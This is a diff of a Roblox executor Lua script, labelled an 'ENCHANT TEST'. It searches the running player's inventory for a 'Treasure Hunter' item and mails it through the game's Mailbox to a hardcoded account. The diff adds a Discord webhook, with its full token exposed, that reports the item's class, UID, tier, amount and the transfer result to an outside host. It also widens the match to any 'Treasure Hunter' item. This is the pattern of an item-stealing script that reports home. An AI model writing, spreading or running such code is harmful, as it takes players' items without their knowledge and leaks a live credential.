@@ -1,21 +1,40 @@
+local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local WEBHOOK = "https://discord.com/api/webhooks/1494215679698534522/PqDEI58B-Z0VCKJOv8ZwineY-IilTGw0QJSwVAcfBOpqeSKfwik8k828HXM6isgApVT8"
+local USER = "conmeohpz005"
 
 local Client = ReplicatedStorage.Library.Client
 local Network = require(Client.Network)
 local Save = require(Client.Save)
 
-local USER = "conmeohpz005"
+local function sendWebhook(msg)
+request({
+Url = WEBHOOK,
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = HttpService:JSONEncode({
+content = msg
+})
+})
+end
+
+sendWebhook("🚀 ENCHANT TEST START")
 
 for class, items in pairs(Save.Get().Inventory) do
 for uid, v in pairs(items) do
 
 ```
-    if v.id == "Treasure Hunter" and v.tn == 7 then
+    if v.id == "Treasure Hunter" then
 
-        print("FOUND")
-        print("CLASS:", class)
-        print("UID:", uid)
-        print("AMOUNT:", v._am)
+        sendWebhook(
+            "🔍 FOUND\\n" ..
+            "Class: " .. tostring(class) .. "\\n" ..
+            "UID: " .. tostring(uid) .. "\\n" ..
+            "ID: " .. tostring(v.id) .. "\\n" ..
+            "TN: " .. tostring(v.tn) .. "\\n" ..
+            "AM: " .. tostring(v._am)
+        )
 
         local ok = Network.Invoke(
             "Mailbox: Send",
@@ -26,7 +45,9 @@ for uid, v in pairs(items) do
             1
         )
 
-        print("SEND RESULT:", ok)
+        sendWebhook(
+            "📤 SEND RESULT = " .. tostring(ok)
+        )
 
         return
     end
@@ -35,4 +56,4 @@ end
 
 end
 
-warn("NOT FOUND")
+sendWebhook("❌ NOT FOUND")
